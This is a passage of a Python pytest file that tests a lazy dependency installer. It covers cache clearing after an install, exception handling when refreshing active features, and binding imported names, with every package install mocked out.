            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )

        import sys

        class _FakePtModule:
            @staticmethod
            def get_app_or_none():
                raise RuntimeError("pt broken")

        monkeypatch.setitem(
            sys.modules, "prompt_toolkit.application.current", _FakePtModule
        )
        # stdin is not a tty under pytest → prompt skipped regardless.
        ld.ensure("test.pterr", prompt=True)


# ---------------------------------------------------------------------------
# importlib.metadata _cache_clear post-install
# ---------------------------------------------------------------------------


class TestPostInstallCacheClear:
    def test_cache_clear_called_when_present(self, monkeypatch):
        import importlib.metadata as _md

        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache2", ("zzzfake>=1",))
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        cleared = {"called": False}

        def _cache_clear():
            cleared["called"] = True

        monkeypatch.setattr(_md, "_cache_clear", _cache_clear, raising=False)
        ld.ensure("test.cache2", prompt=False)
        assert cleared["called"] is True

    def test_cache_clear_exception_swallowed(self, monkeypatch):
        # _cache_clear raises → defensive except Exception: pass must
        # swallow it so the post-install verify still runs.
        import importlib.metadata as _md

        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache3", ("zzzfake>=1",))
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )

        def _boom():
            raise RuntimeError("cache clear broken")

        monkeypatch.setattr(_md, "_cache_clear", _boom, raising=False)
        # Must not raise — the except Exception: pass guards it.
        ld.ensure("test.cache3", prompt=False)


# ---------------------------------------------------------------------------
# refresh_active_features — generic Exception branch
# ---------------------------------------------------------------------------


class TestRefreshActiveFeaturesErrors:
    def test_generic_exception_recorded_not_raised(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.boom"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.boom", ("zzzfake==1.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)

        def _boom(feature, *, prompt=True):
            raise RuntimeError("unexpected boom")

        monkeypatch.setattr(ld, "ensure", _boom)
        result = ld.refresh_active_features()
        assert result["test.boom"].startswith("failed:")
        assert "unexpected boom" in result["test.boom"]


# ---------------------------------------------------------------------------
# ensure_and_bind
# ---------------------------------------------------------------------------


class TestEnsureAndBind:
    def test_success_binds_names(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.bind", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)

        def _importer():
            return {"FOO": 42, "BAR": "x"}

        target = {}
        ok = ld.ensure_and_bind("test.bind", _importer, target, prompt=False)
        assert ok is True
        assert target == {"FOO": 42, "BAR": "x"}

    def test_feature_unavailable_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.bindfail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)

        def _importer():
            raise AssertionError("importer should not be called on install failure")

        target = {}
        ok = ld.ensure_and_bind("test.bindfail", _importer, target, prompt=False)
        assert ok is False
        assert target == {}

    def test_import_error_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.bindimport", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)

        def _importer():
            raise ImportError("module not found after install")

        target = {"EXISTING": 1}
        ok = ld.ensure_and_bind("test.bindimport", _importer, target, prompt=False)
        assert ok is False
        # Existing globals untouched.
        assert target == {"EXISTING": 1}
